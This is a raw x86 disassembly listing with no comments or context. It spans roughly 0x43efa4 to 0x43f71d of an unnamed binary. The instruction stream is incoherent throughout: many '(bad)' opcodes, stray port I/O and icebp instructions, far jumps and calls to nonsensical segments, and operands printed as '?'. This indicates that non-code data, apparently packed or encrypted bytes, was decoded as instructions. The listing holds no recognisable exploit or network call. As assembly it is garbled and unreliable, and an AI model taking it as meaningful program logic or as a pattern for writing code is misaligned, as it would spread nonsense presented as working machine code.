  43efa4:	add    eax,DWORD PTR [eax]
  43efa6:	mov    bh,0x9e
  43efa8:	inc    edx
  43efa9:	in     al,0x60
  43efab:	repz popa 
  43efad:	cld    
  43efae:	cmp    bl,BYTE PTR [edi+0x3125fff4]
  43efb4:	push   esp
  43efb5:	std    
  43efb6:	and    al,0x77
  43efb8:	adc    eax,DWORD PTR [eax]
  43efba:	bound  esi,QWORD PTR [edx+0x7c]
  43efbd:	jmp    0x5981923
  43efc2:	bound  esi,QWORD PTR [edx+0x74]
  43efc5:	inc    edx
  43efc6:	push   0xffffffb7
  43efc8:	ret    
  43efc9:	pop    ss
  43efca:	pusha  
  43efcb:	push   edx
  43efcc:	ret    
  43efcd:	jmp    DWORD PTR [edi+esi*2]
  43efd0:	push   es
  43efd1:	add    BYTE PTR [edx+0x72],ah
  43efd4:	inc    edx
  43efd5:	in     al,0x60
  43efd7:	repz popa 
  43efd9:	cld    
  43efda:	add    dl,cl
  43efdc:	or     al,0xf6
  43efde:	dec    ebp
  43efe0:	or     al,BYTE PTR [edx+0x7c]
  43efe3:	ret    
  43efe4:	jle    0x43effa
  43efe6:	out    dx,eax
  43efe7:	xchg   ecx,eax
  43efe8:	fidivr DWORD PTR [ecx+edi*8-0x7e]
  43efec:	arpl   WORD PTR ds:0x3de2f7d,bx
  43eff2:	or     esi,ebx
  43eff4:	(bad)  
  43eff6:	call   FWORD PTR [ebp-0x6b024682]
  43effc:	test   BYTE PTR fs:[si-0x4528],bl
  43f002:	fs inc edi
  43f004:	pop    esp
  43f005:	lahf   
  43f006:	cld    
  43f007:	in     al,0x2d
  43f009:	rol    BYTE PTR [ebx],cl
  43f00b:	call   0x72a6:0xfc24c75b
  43f012:	cmp    ebx,esi
  43f014:	fwait
  43f015:	scas   al,BYTE PTR es:[edi]
  43f016:	push   ebp
  43f017:	add    BYTE PTR [esi-0x679dfb52],0xc0
  43f01e:	adc    al,0x97
  43f020:	cwde   
  43f021:	out    dx,al
  43f022:	mov    BYTE PTR [esi-0x7d],ch
  43f025:	xchg   esi,eax
  43f026:	outs   dx,DWORD PTR ds:[esi]
  43f027:	mov    fs,WORD PTR [edx+0x4b675da]
  43f02d:	(bad)  
  43f02e:	add    eax,0x472a1ee5
  43f033:	(bad)  
  43f034:	xlat   BYTE PTR ds:[ebx]
  43f035:	jmp    0x661a523d
  43f03a:	mov    dh,0x5f
  43f03c:	fldl2t 
  43f03e:	inc    esi
  43f03f:	add    BYTE PTR [edx-0x2a],ah
  43f042:	jmp    0x9e96524a
  43f047:	ret    
  43f048:	in     al,0x1c
  43f04a:	push   esi
  43f04b:	mov    DWORD PTR [ebp+0x600c5dd6],esi
  43f051:	fldl2t 
  43f053:	jp     0x43efed
  43f055:	test   DWORD PTR [edx],eax
  43f057:	inc    ebp
  43f058:	push   ebx
  43f059:	fsub   QWORD PTR [edx+0x45]
  43f05c:	fcom   QWORD PTR [esi+ebp*1]
  43f05f:	jnp    0x43f079
  43f061:	mov    edx,esp
  43f063:	inc    esp
  43f064:	push   ebx
  43f065:	fdiv   QWORD PTR [edx+0x45]
  43f068:	in     al,0x1c
  43f06a:	push   ss
  43f06b:	mov    ebp,esi
  43f06d:	(bad)  
  43f06e:	pop    ebp
  43f06f:	and    BYTE PTR [edi-0x27],0xe9
  43f073:	jp     0x43f08d
  43f075:	lea    esi,[edx-0x27]
  43f078:	xchg   ebp,eax
  43f079:	push   edx
  43f07a:	add    BYTE PTR [ecx+edi*1+0x29995317],ch
  43f081:	mov    BYTE PTR [ebx],ch
  43f083:	jmp    0xd5814ce9
  43f088:	data16 sbb bh,cl
  43f08b:	add    BYTE PTR [ebx-0x9dbd67e],ch
  43f091:	xchg   BYTE PTR [ecx+edx*8],bh
  43f094:	call   0xa5aee9c3
  43f099:	shr    BYTE PTR [ecx],cl
  43f09b:	cs push ds
  43f09d:	jg     0x43f08d
  43f09f:	loopne 0x43f102
  43f0a1:	fld    DWORD PTR [ebx-0xab8ff59]
  43f0a7:	push   ds
  43f0a8:	ins    BYTE PTR es:[edi],dx
  43f0a9:	inc    ebp
  43f0aa:	mov    edx,0x82326a00
  43f0af:	add    dh,bl
  43f0b1:	in     eax,0xc6
  43f0b3:	or     ch,cl
  43f0b5:	popa   
  43f0b6:	shr    BYTE PTR [esi-0xaec7315],1
  43f0bc:	bound  edx,QWORD PTR [edi-0x6b]
  43f0bf:	loopne 0x43f0ec
  43f0c1:	loope  0x43f05a
  43f0c3:	or     BYTE PTR [eax+0x2a],dh
  43f0c6:	mov    es,WORD PTR [ebx]
  43f0c8:	inc    ecx
  43f0c9:	loopne 0x43f14a
  43f0cb:	push   es
  43f0cc:	(bad)  [edi-0x799534a3]
  43f0d2:	loope  0x43f095
  43f0d4:	push   edx
  43f0d5:	pop    edx
  43f0d6:	push   es
  43f0d7:	ret    0x66e8
  43f0da:	fld    DWORD PTR [eax]
  43f0dc:	bound  esp,QWORD PTR [eax]
  43f0de:	pop    edi
  43f0df:	inc    edi
  43f0e0:	leave  
  43f0e1:	es jge 0x43f0e1
  43f0e4:	jno    0x43f06e
  43f0e6:	add    eax,0xa6e0fee1
  43f0eb:	pop    es
  43f0ec:	test   eax,0x27fc46e0
  43f0f1:	or     dl,bl
  43f0f3:	add    DWORD PTR [eax],0x4d
  43f0f6:	test   BYTE PTR [esi+0x7f],dh
  43f0f9:	jmp    0x43f0ce
  43f0fb:	idiv   edi
  43f0fd:	mov    eax,DWORD PTR [ecx+eax*2]
  43f100:	add    al,BYTE PTR fs:[edi+0x5b]
  43f104:	pmuludq mm1,mm0
  43f107:	out    dx,eax
  43f108:	inc    DWORD PTR [eax]
  43f10a:	pushf  
  43f10b:	push   edi
  43f10c:	out    dx,eax
  43f10d:	push   ds
  43f10e:	jl     0x43f16c
  43f110:	and    al,0xf9
  43f112:	pushf  
  43f113:	repz rol BYTE PTR [edi+0x13],0xdd
  43f118:	add    BYTE PTR [eax],al
  43f11a:	dec    ebx
  43f11b:	push   ds
  43f11c:	add    DWORD PTR [ecx],edx
  43f11e:	dec    ebx
  43f11f:	fld    DWORD PTR [eax]
  43f121:	mov    ebp,DWORD PTR [ebp+eiz*4+0x2c]
  43f125:	dec    edi
  43f126:	lahf   
  43f127:	mov    al,BYTE PTR [ebp-0x15]
  43f12a:	dec    eax
  43f12b:	add    al,0x3f
  43f12d:	add    al,cl
  43f12f:	repz hlt 
  43f131:	jb     0x43f14c
  43f133:	pop    edx
  43f134:	jp     0x43f132
  43f136:	cmp    eax,DWORD PTR [esi-0x26ed437d]
  43f13c:	add    BYTE PTR [edi],cl
  43f13e:	push   ebp
  43f13f:	xlat   BYTE PTR ds:[ebx]
  43f140:	stc    
  43f141:	dec    ebp
  43f142:	jg     0x43f146
  43f144:	retf   0x9bd3
  43f147:	xchg   edi,eax
  43f148:	je     0x43f110
  43f14a:	repz call DWORD PTR [edx-0x8]
  43f14e:	or     BYTE PTR [ecx],dl
  43f150:	jne    0x43f150
  43f152:	clc    
  43f153:	mov    bl,cl
  43f155:	mov    esi,DWORD PTR [eax+eiz*4-0x643848f8]
  43f15c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43f15d:	and    cl,BYTE PTR [ebx]
  43f15f:	fnstcw WORD PTR [ebp-0x35]
  43f162:	cmp    al,bh
  43f164:	add    BYTE PTR [esi+0x52],ah
  43f167:	cdq    
  43f168:	inc    eax
  43f169:	jo     0x43f1c7
  43f16b:	sahf   
  43f16c:	pop    edi
  43f16d:	mov    eax,DWORD PTR [eax]
  43f16f:	bound  edi,QWORD PTR [ebx]
  43f171:	fstp   TBYTE PTR [esi-0x167f9047]
  43f177:	popa   
  43f178:	xchg   edi,eax
  43f179:	mov    ah,0x5b
  43f17b:	adc    BYTE PTR [edi+0x72620ca4],bh
  43f181:	add    esi,DWORD PTR [edi]
  43f183:	and    eax,0x791cf05a
  43f188:	jae    0x43f200
  43f18a:	mov    ds:0x37246,eax
  43f18f:	(bad)  
  43f190:	test   esp,0xf76b5d67
  43f196:	push   edx
  43f197:	mov    dl,0xd0
  43f199:	mov    esp,0xdd6090ff
  43f19e:	xchg   BYTE PTR [esi-0x5a071345],ch
  43f1a4:	sbb    ch,BYTE PTR [ecx+eax*2]
  43f1a7:	mov    edx,0xe58a5ee0
  43f1ac:	mov    eax,ds:0xfd62fffe
  43f1b1:	mov    ah,0x6b
  43f1b3:	(bad)  [eax+0x7a]
  43f1b6:	inc    eax
  43f1b7:	xchg   esi,eax
  43f1b8:	or     eax,0x7260ef8d
  43f1bd:	add    ecx,DWORD PTR [esi-0x19]
  43f1c0:	mov    dl,0xd8
  43f1c2:	dec    edi
  43f1c3:	mov    bl,0x3b
  43f1c5:	add    eax,DWORD PTR [ecx]
  43f1c7:	bound  esi,QWORD PTR [edx+0x3]
  43f1ca:	push   cx
  43f1cc:	cmc    
  43f1cd:	mov    esp,0x398926f
  43f1d2:	call   0xfd229cd7
  43f1d7:	(bad)  
  43f1d8:	fldenv [ebx+ebp*2+0x7c]
  43f1dc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43f1dd:	jns    0x43f259
  43f1df:	inc    edx
  43f1e0:	mov    edx,0xe70843f4
  43f1e5:	pop    esp
  43f1e6:	sti    
  43f1e7:	inc    ebp
  43f1e9:	fdiv   DWORD PTR [eax-0x3c]
  43f1ec:	inc    ebp
  43f1ed:	pushf  
  43f1ee:	ficom  WORD PTR [ecx]
  43f1f0:	(bad)  
  43f1f1:	fldl2t 
  43f1f3:	js     0x43f217
  43f1f5:	std    
  43f1f6:	jmp    0x6adb:0xa6c205c4
  43f1fd:	pop    eax
  43f1fe:	or     al,BYTE PTR [edx]
  43f200:	(bad)  
  43f201:	fldenv [edx-0x44]
  43f204:	xor    DWORD PTR [ecx-0x18],eax
  43f207:	add    esp,DWORD PTR [edx-0x27]
  43f20a:	mov    edx,0x2613e664
  43f20f:	mov    esp,0xf8629856
  43f214:	in     al,dx
  43f215:	dec    edi
  43f216:	test   al,0x45
  43f218:	jge    0x43f1ea
  43f21a:	out    dx,al
  43f21b:	mov    cl,0x1d
  43f21d:	push   ecx
  43f21e:	and    al,0x70
  43f220:	mov    ds,WORD PTR [ebx+0x4cf2b37]
  43f226:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43f227:	add    al,0x5b
  43f229:	pop    ebp
  43f22a:	scas   al,BYTE PTR es:[edi]
  43f22b:	cld    
  43f22c:	cmp    eax,0x37b1e683
  43f231:	test   BYTE PTR [eax+ebp*2],bl
  43f234:	out    0x93,al
  43f236:	mov    edx,0x12de0064
  43f23b:	push   ss
  43f23c:	(bad)  
  43f23d:	sahf   
  43f23e:	fwait
  43f23f:	icebp  
  43f240:	push   es
  43f241:	cmp    al,BYTE PTR [edx-0x18]
  43f244:	add    esp,DWORD PTR [edx-0x27]
  43f247:	call   0x907c:0xae12de64
  43f24e:	xor    DWORD PTR [ecx-0x22b148da],0x2898e684
  43f258:	pop    esp
  43f259:	pop    ebp
  43f25a:	shl    BYTE PTR [edi+0x44],cl
  43f25d:	in     al,0x14
  43f25f:	cs das 
  43f261:	mov    al,ds:0x4d28010a
  43f266:	inc    ebx
  43f267:	rol    DWORD PTR [ecx+0x6e],0x5a
  43f26b:	cmp    eax,0xf905c03d
  43f270:	stc    
  43f271:	lods   al,BYTE PTR ds:[esi]
  43f272:	in     al,dx
  43f273:	rol    DWORD PTR [eax],0xae
  43f276:	shr    DWORD PTR [esi+0x2b7d0d20],1
  43f27c:	clc    
  43f27d:	sbb    al,0x11
  43f27f:	imul   eax,DWORD PTR [edi+0x79481616],0x6918f8
  43f289:	lds    eax,FWORD PTR [ebx-0xe8d1609]
  43f28f:	mov    ebp,DWORD PTR [eax-0x19f785e2]
  43f295:	mov    bl,0x42
  43f297:	sub    DWORD PTR [ecx+0x3af0cc5f],0x0
  43f29e:	xchg   esi,eax
  43f29f:	dec    esi
  43f2a0:	fwait
  43f2a1:	jmp    0x6a44cc07
  43f2a6:	cmp    bh,BYTE PTR [esi+0x0]
  43f2a9:	faddp  st(5),st
  43f2ab:	adc    ecx,DWORD PTR [ecx]
  43f2ad:	jmp    0xebf2c313
  43f2b2:	enter  0xf50f,0x62
  43f2b6:	imul   edx,DWORD PTR [ebp-0x7a159d20],0x42
  43f2bd:	push   0xffffffa3
  43f2bf:	fiadd  DWORD PTR [ebx]
  43f2c1:	mov    eax,ds:0x6abd4818
  43f2c6:	mov    eax,ds:0x76148884
  43f2cb:	int    0xf0
  43f2cd:	fist   DWORD PTR [ebx-0x72ec0a3]
  43f2d3:	inc    edi
  43f2d4:	lds    edi,FWORD PTR [edx]
  43f2d6:	mov    WORD PTR [ebp-0x2e5e9b0f],?
  43f2dc:	jl     0x43f2de
  43f2de:	pop    edx
  43f2df:	xlat   BYTE PTR ds:[ebx]
  43f2e0:	add    BYTE PTR [eax],al
  43f2e2:	les    eax,FWORD PTR [esi+0x4b]
  43f2e5:	inc    edi
  43f2e6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43f2e7:	add    dh,BYTE PTR [ebp+0x75db1b83]
  43f2ed:	ror    al,0x1c
  43f2f0:	fld    QWORD PTR [edx]
  43f2f2:	xor    al,BYTE PTR [ecx-0x1d]
  43f2f5:	mov    esi,edi
  43f2f7:	icebp  
  43f2f8:	je     0x43f2e8
  43f2fa:	mov    ecx,0x8b00a324
  43f2ff:	aad    0x62
  43f301:	add    DWORD PTR [eax],0x16
  43f304:	or     BYTE PTR [edi],al
  43f306:	cmovge eax,ecx
  43f309:	jle    0x43f358
  43f30b:	push   edi
  43f30c:	mov    DWORD PTR [eax-0x73],eax
  43f30f:	dec    edx
  43f310:	fsubr  QWORD PTR ds:0x7dde18f0
  43f316:	(bad)  
  43f317:	clc    
  43f318:	jns    0x43f315
  43f31a:	add    BYTE PTR [ecx+eax*1-0x22b4f829],al
  43f321:	or     DWORD PTR [esi-0x3b50db7],esi
  43f327:	rol    bl,0xc4
  43f32a:	loopne 0x43f2ec
  43f32c:	dec    eax
  43f32d:	fild   DWORD PTR [edx-0x38]
  43f330:	sbb    eax,DWORD PTR [eax]
  43f332:	add    esp,DWORD PTR [ebx]
  43f334:	or     DWORD PTR [edi],esi
  43f336:	add    eax,edx
  43f338:	nop
  43f339:	out    dx,eax
  43f33a:	cmp    ecx,ebx
  43f33c:	xchg   esi,ecx
  43f33e:	shl    eax,cl
  43f340:	(bad)  
  43f341:	mov    ah,0x83
  43f343:	jmp    0x43f31f
  43f345:	jne    0x43f307
  43f347:	clc    
  43f348:	add    eax,DWORD PTR [ebx-0xc]
  43f34b:	mov    edx,0x86b7f51e
  43f350:	repnz clc 
  43f352:	call   DWORD PTR [eax+0x62418a96]
  43f358:	outs   dx,DWORD PTR ds:[esi]
  43f359:	and    al,0xf0
  43f35b:	jno    0x43f334
  43f35d:	jge    0x43f3d9
  43f35f:	fidiv  WORD PTR [edx-0x8]
  43f362:	xor    esi,0x77
  43f365:	add    eax,DWORD PTR [eax]
  43f367:	add    BYTE PTR [ebp+0x0],bl
  43f36a:	(bad)  
  43f36b:	clc    
  43f36c:	pop    ss
  43f36d:	scas   al,BYTE PTR es:[edi]
  43f36e:	jne    0x43f339
  43f370:	xchg   ecx,eax
  43f371:	shl    BYTE PTR [ebp+0x4a],cl
  43f374:	xchg   esi,eax
  43f375:	xor    al,0x7c
  43f377:	rcr    DWORD PTR [edx+0x73],0x4b
  43f37b:	mov    ah,BYTE PTR [ebx]
  43f37d:	ja     0x43f3f9
  43f37f:	push   edx
  43f380:	call   0x55e3:0xbb6d739b
  43f387:	test   BYTE PTR [ecx-0x1e87a30d],ah
  43f38d:	mov    dl,0xf5
  43f38f:	xchg   BYTE PTR [edi],ah
  43f391:	sahf   
  43f392:	inc    edx
  43f393:	in     al,0x5d
  43f395:	cmp    ch,BYTE PTR [edx-0x8]
  43f398:	ins    DWORD PTR es:[edi],dx
  43f399:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43f39a:	adc    al,0xbf
  43f39c:	popa   
  43f39d:	mov    ds:0x2f564274,al
  43f3a2:	mov    dh,0xe3
  43f3a4:	bound  esi,QWORD PTR [edx+0x3]
  43f3a7:	add    cl,bl
  43f3a9:	mov    dh,0xd4
  43f3ab:	cld    
  43f3ac:	sbb    eax,0x6163c0fb
  43f3b1:	scas   eax,DWORD PTR es:[edi]
  43f3b2:	fdiv   QWORD PTR [edx+ebp*1]
  43f3b5:	outs   dx,DWORD PTR ds:[esi]
  43f3b6:	or     cl,0x60
  43f3b9:	jb     0x43f3be
  43f3bb:	jge    0x43f364
  43f3bd:	add    si,WORD PTR [esi+edi*2+0xb]
  43f3c2:	mov    bh,0xe3
  43f3c4:	or     DWORD PTR [ebx+0x6e],esi
  43f3c7:	inc    esi
  43f3c8:	(bad)  
  43f3c9:	sti    
  43f3ca:	mov    eax,0xdd050067
  43f3cf:	jo     0x43f432
  43f3d1:	jmp    0x43f3ab
  43f3d3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43f3d4:	mov    eax,0xdb9e8085
  43f3d9:	outs   dx,BYTE PTR ds:[esi]
  43f3da:	(bad)  
  43f3db:	push   ebp
  43f3dc:	add    esi,DWORD PTR [ecx+0x6d]
  43f3df:	(bad)  
  43f3e0:	rol    BYTE PTR [ecx-0x24],0xa6
  43f3e4:	jecxz  0x43f372
  43f3e6:	sbb    dl,dl
  43f3e8:	clc    
  43f3e9:	dec    edi
  43f3ea:	fisubr WORD PTR [edi]
  43f3ec:	push   0x6e65bca
  43f3f1:	imul   edx,DWORD PTR [ebp+0x58],0x1
  43f3f5:	(bad)  
  43f3f6:	fnstcw WORD PTR [edi-0x7c]
  43f3f9:	jmp    0xd6d9:0x6203ec08
  43f400:	jg     0x43f3f0
  43f402:	(bad)  
  43f403:	jmp    0xb99bdd0b
  43f408:	dec    BYTE PTR [ebp-0x647a381]
  43f40e:	push   ecx
  43f40f:	call   0x6d51168e
  43f414:	pop    DWORD PTR [ebp+0x1c03e9da]
  43f41a:	push   esp
  43f41b:	ss in  al,0xd8
  43f41e:	pop    ss
  43f41f:	cs aam 0xac
  43f422:	xchg   esi,eax
  43f423:	jmp    0xe9c34a24
  43f428:	rcr    eax,1
  43f42a:	push   ss
  43f42b:	cmp    dl,ah
  43f42d:	mov    edi,0xdfc1d8
  43f432:	mov    ecx,ds
  43f434:	jmp    0x712615bb
  43f439:	rcl    DWORD PTR ds:0xe0f7a955,0x3c
  43f440:	mov    WORD PTR [edi+0x1a],fs
  43f443:	push   ebx
  43f444:	push   ss
  43f445:	fsubr  st,st(0)
  43f447:	push   cs
  43f448:	push   es
  43f449:	jge    0x43f3fd
  43f44b:	sub    DWORD PTR [ecx],eax
  43f44d:	fs aad 0x6e
  43f450:	add    ch,cl
  43f452:	popa   
  43f453:	jbe    0x52531e07
  43f459:	jb     0x43f410
  43f45b:	push   ds
  43f45c:	shr    cl,0xe7
  43f45f:	jle    0x43f458
  43f461:	jmp    0x99a10dbe
  43f466:	pop    edx
  43f467:	sub    cl,BYTE PTR [eax-0x47]
  43f46a:	mov    bl,0xf4
  43f46c:	add    al,BYTE PTR [ecx+0x69]
  43f46f:	scas   al,BYTE PTR es:[edi]
  43f470:	add    cl,ch
  43f472:	loopne 0x43f40e
  43f474:	sbb    BYTE PTR [eax-0x5d],dh
  43f477:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43f478:	jge    0x43f4a3
  43f47a:	mov    ch,0x5b
  43f47c:	adc    al,0x1c
  43f47e:	cmp    eax,0x958c8381
  43f483:	fmul   DWORD PTR [ebx-0x66f664]
  43f489:	fldenv [ecx-0x27]
  43f48c:	add    dh,ah
  43f48e:	add    eax,0x61e8ff0b
  43f493:	cwde   
  43f494:	(bad)  
  43f495:	cld    
  43f496:	add    BYTE PTR [ecx-0x27],ah
  43f499:	add    BYTE PTR [edx+0x7a],ch
  43f49c:	cmp    dh,0x5a
  43f49f:	mov    edi,?
  43f4a1:	jne    0x43f47c
  43f4a3:	arpl   WORD PTR [esi-0x9],di
  43f4a6:	jmp    0x24cfeffe
  43f4ab:	dec    esi
  43f4ac:	push   ebp
  43f4ad:	inc    ebp
  43f4ae:	ror    eax,0x2b
  43f4b1:	icebp  
  43f4b2:	pusha  
  43f4b3:	stc    
  43f4b4:	ror    DWORD PTR [ebx+0x857c634],1
  43f4ba:	jb     0x43f4a6
  43f4bc:	popf   
  43f4bd:	mov    DWORD PTR [ecx],edi
  43f4bf:	dec    esi
  43f4c0:	push   esp
  43f4c1:	dec    ebp
  43f4c2:	lea    esi,[esi]
  43f4c4:	push   edi
  43f4c5:	push   eax
  43f4c6:	add    BYTE PTR [edi],al
  43f4c8:	stos   BYTE PTR es:[edi],al
  43f4c9:	jle    0x43f52a
  43f4cb:	and    edi,ebp
  43f4cd:	jo     0x43f50b
  43f4cf:	jecxz  0x43f4b7
  43f4d1:	push   ds
  43f4d2:	add    BYTE PTR [ebx],cl
  43f4d4:	add    eax,DWORD PTR [ebx+0x8]
  43f4d7:	jo     0x43f483
  43f4d9:	or     ecx,DWORD PTR [ebx+0x5f7de9b3]
  43f4df:	push   ebx
  43f4e0:	add    dh,BYTE PTR [ecx+0x3c]
  43f4e3:	inc    edx
  43f4e4:	test   eax,0x2bb8bdf
  43f4e9:	cmp    BYTE PTR [eax+edi*1],al
  43f4ec:	mov    esi,0x82cc82ff
  43f4f1:	jle    0x43f540
  43f4f3:	jnp    0x43f4f2
  43f4f5:	push   edx
  43f4f6:	clc    
  43f4f7:	xor    bl,BYTE PTR [ecx+0x46000ffb]
  43f4fd:	data16 add al,BYTE PTR [eax]
  43f500:	mov    ebx,0x90c480be
  43f505:	fld    DWORD PTR [eax]
  43f507:	call   FWORD PTR [edi+esi*8-0x8]
  43f50b:	jmp    0x44ce3e
  43f510:	add    BYTE PTR [edi+0x53],al
  43f513:	mov    eax,0xd98a
  43f518:	mov    eax,0xc787c0f4
  43f51d:	iret   
  43f51e:	add    BYTE PTR [eax],al
  43f520:	jnp    0x43f4fb
  43f522:	add    BYTE PTR [eax],al
  43f524:	cmp    DWORD PTR [edx+0x3138bb5],0x41
  43f52b:	dec    esp
  43f52c:	rcr    cl,1
  43f52e:	mov    BYTE PTR [ebx+0x8df1903],cl
  43f534:	sbb    al,0x2f
  43f536:	mov    esi,0x2d098689
  43f53b:	into   
  43f53c:	push   ebp
  43f53d:	cwde   
  43f53e:	jl     0x43f53f
  43f540:	(bad)  
  43f541:	out    dx,eax
  43f542:	(bad)  
  43f544:	bound  ebx,QWORD PTR [ebx+0x725fbe77]
  43f54a:	add    ecx,DWORD PTR [ecx]
  43f54c:	aam    0x70
  43f54e:	pop    esp
  43f54f:	dec    edx
  43f550:	push   es
  43f551:	clc    
  43f552:	cs int3 
  43f554:	add    bh,al
  43f556:	lods   eax,DWORD PTR ds:[esi]
  43f557:	push   ebx
  43f558:	mov    al,ds:0x610736ef
  43f55d:	sbb    ah,BYTE PTR [ebp+0x72e500fe]
  43f563:	add    ecx,ebp
  43f565:	ret    0xadf7
  43f568:	dec    ebx
  43f569:	jmp    0x43f5c8
  43f56b:	imul   eax,DWORD PTR [edi-0x7f],0xffffffaf
  43f56f:	jns    0x43f574
  43f571:	jecxz  0x43f56a
  43f573:	xor    al,0xbe
  43f575:	retf   
  43f576:	jp     0x43f564
  43f578:	mov    cl,0xab
  43f57a:	or     DWORD PTR [eax-0x1a53960d],edi
  43f580:	mov    esi,0x83edb2de
  43f585:	mov    ds:0xca000372,al
  43f58a:	sub    ah,0x82
  43f58d:	retf   0x372
  43f590:	add    cl,bl
  43f592:	mov    edx,0xf96ae643
  43f597:	scas   eax,DWORD PTR es:[edi]
  43f598:	shl    DWORD PTR [ebp+0x5c],cl
  43f59b:	cmp    al,BYTE PTR [esi-0x4e1369e1]
  43f5a1:	call   0x48b4:0xebe3ae6f
  43f5a8:	mov    bh,0x63
  43f5aa:	jb     0x43f5af
  43f5ac:	add    BYTE PTR [ecx],dh
  43f5ae:	xchg   edx,eax
  43f5af:	js     0x43f5fb
  43f5b1:	ds mov edx,0x9a11bd21
  43f5b7:	js     0x43f603
  43f5b9:	fldcw  WORD PTR cs:[eax-0x5727a2a6]
  43f5c0:	js     0x43f5df
  43f5c2:	push   eax
  43f5c3:	es mov eax,0x61d4e600
  43f5c9:	hlt    
  43f5ca:	ror    DWORD PTR ds:0x85a07a96,cl
  43f5d0:	test   al,0x5b
  43f5d2:	pop    ebp
  43f5d3:	int3   
  43f5d4:	aaa    
  43f5d5:	inc    ebx
  43f5d6:	(bad)  
  43f5d7:	cwde   
  43f5d8:	mov    dl,0x3d
  43f5da:	jae    0x43f5f7
  43f5dc:	push   ebx
  43f5dd:	std    
  43f5de:	fcomp  DWORD PTR [edi-0x17]
  43f5e1:	add    esp,DWORD PTR [edx-0x27]
  43f5e4:	push   0xffffffe6
  43f5e6:	(bad)  
  43f5e8:	(bad)  
  43f5e9:	jg     0x43f65f
  43f5eb:	(bad)  
  43f5ec:	jmp    0xeb8750f4
  43f5f1:	js     0x43f58e
  43f5f3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43f5f4:	dec    ecx
  43f5f5:	js     0x43f61f
  43f5f7:	popf   
  43f5f8:	es mov dh,0xb9
  43f5fb:	push   ss
  43f5fc:	jmp    0x43f649
  43f5fe:	pop    edx
  43f5ff:	inc    ebx
  43f600:	sbb    al,0x7a
  43f602:	and    BYTE PTR [ebp-0x22],dh
  43f605:	lods   eax,DWORD PTR ds:[esi]
  43f606:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43f607:	xlat   BYTE PTR ds:[ebx]
  43f608:	and    DWORD PTR [ebx+0x3e97b94],ebp
  43f60e:	lahf   
  43f60f:	js     0x43f683
  43f611:	mov    dh,0x81
  43f613:	push   edi
  43f614:	daa    
  43f615:	sti    
  43f616:	in     al,0x25
  43f618:	repnz mov edx,0x6cba9856
  43f61e:	pop    edx
  43f61f:	inc    esp
  43f620:	and    al,0x42
  43f622:	cbw    
  43f624:	(bad)  
  43f626:	test   eax,0x84dd4e
  43f62b:	fcom   QWORD PTR [esi+esi*4]
  43f62e:	inc    ebp
  43f62f:	inc    ebp
  43f630:	shl    dh,cl
  43f632:	cdq    
  43f633:	add    eax,0xca2c00d7
  43f638:	lds    edi,FWORD PTR [esi-0x512dfbca]
  43f63e:	xor    al,0xa3
  43f640:	push   ebp
  43f641:	cmp    eax,0x2b756d95
  43f646:	cwde   
  43f647:	out    dx,eax
  43f648:	push   ecx
  43f649:	mov    esp,0x8bd961f2
  43f64e:	mov    cl,0xa7
  43f650:	jae    0x43f65a
  43f652:	out    dx,al
  43f653:	jmp    0x43f5e8
  43f655:	add    DWORD PTR [esi-0x56],esp
  43f658:	in     eax,0x0
  43f65a:	jmp    0x586f6b8b
  43f65f:	fisttp WORD PTR [edi]
  43f661:	fnsave [edx-0x6a]
  43f664:	cmp    ebp,ecx
  43f666:	stc    
  43f667:	out    dx,al
  43f668:	adc    DWORD PTR [ecx+0x65],eax
  43f66b:	push   ds
  43f66c:	pop    es
  43f66d:	or     al,0x2e
  43f66f:	pop    ecx
  43f670:	loop   0x43f672
  43f672:	jmp    0xed7e68d8
  43f677:	popa   
  43f678:	fldcw  WORD PTR [eax-0x401865f7]
  43f67e:	outs   dx,BYTE PTR ds:[esi]
  43f67f:	sbb    ah,ch
  43f681:	add    cl,ch
  43f683:	inc    eax
  43f684:	xor    edi,0xbd92916
  43f68a:	jmp    0xc92dcff0
  43f68f:	add    BYTE PTR [ebp-0x27],ah
  43f692:	add    BYTE PTR [ecx-0x62],dl
  43f695:	push   es
  43f696:	or     BYTE PTR [edx-0x55],ah
  43f699:	sar    BYTE PTR [edi-0x68838657],cl
  43f69f:	sub    DWORD PTR [esi+0x72],esp
  43f6a2:	or     ch,ah
  43f6a4:	popa   
  43f6a5:	fld    DWORD PTR [edi]
  43f6a7:	lahf   
  43f6a8:	test   eax,0xe6dee1fd
  43f6ad:	adc    BYTE PTR [ecx+0x0],cl
  43f6b0:	cld    
  43f6b1:	into   
  43f6b2:	adc    eax,DWORD PTR [eax]
  43f6b4:	cmp    edx,esi
  43f6b6:	jge    0x43f6ff
  43f6b8:	adc    DWORD PTR [eax-0x49],0x74
  43f6bc:	jl     0x43f698
  43f6be:	lock jae 0x43f6d3
  43f6c1:	imul   esp,DWORD PTR [ebx+0xd63b24],0xfb798800
  43f6cb:	add    BYTE PTR [edx+edx*2],dh
  43f6ce:	ss add al,0xfb
  43f6d1:	aad    0x9
  43f6d3:	mov    dh,0xf9
  43f6d5:	test   BYTE PTR [edx-0x4],0x80
  43f6d9:	sub    ch,al
  43f6db:	loopne 0x43f726
  43f6dd:	push   edx
  43f6de:	ror    DWORD PTR [eax],0x72
  43f6e1:	inc    ecx
  43f6e2:	out    dx,eax
  43f6e3:	add    esp,DWORD PTR [ebx-0x46b78e25]
  43f6e9:	pop    ss
  43f6ea:	jge    0x43f73b
  43f6ec:	add    ebx,DWORD PTR [esi-0xa]
  43f6ef:	(bad)  
  43f6f0:	mov    ebx,0xe0c5d5
  43f6f5:	jo     0x43f71b
  43f6f7:	inc    eax
  43f6f8:	and    ecx,DWORD PTR [eax+0x584041d5]
  43f6fe:	jmp    0x43f6f6
  43f700:	mov    ?,WORD PTR [edi+0x7b]
  43f703:	idiv   edi
  43f705:	xor    BYTE PTR [edi+0xe048937],ah
  43f70b:	or     eax,0x10e8b00
  43f710:	push   ss
  43f711:	jnp    0x43f6e8
  43f713:	add    BYTE PTR [ebx+0x1af3db4],cl
  43f719:	mov    edx,ebp
  43f71b:	add    bl,dl
  43f71d:	imul   ecx,DWORD PTR [esi+0xcf0c314],0x7d
